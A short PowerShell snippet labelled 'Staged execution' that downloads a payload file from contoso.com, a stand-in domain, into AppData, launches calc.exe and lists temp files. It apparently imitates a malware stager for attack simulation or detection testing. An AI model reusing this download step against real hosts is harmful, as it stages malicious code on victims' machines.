
<# Staged execution #> $PayloadUrl = 'https://contoso.com:443/update.dat'; $OutputPath = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $OutputPath); Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
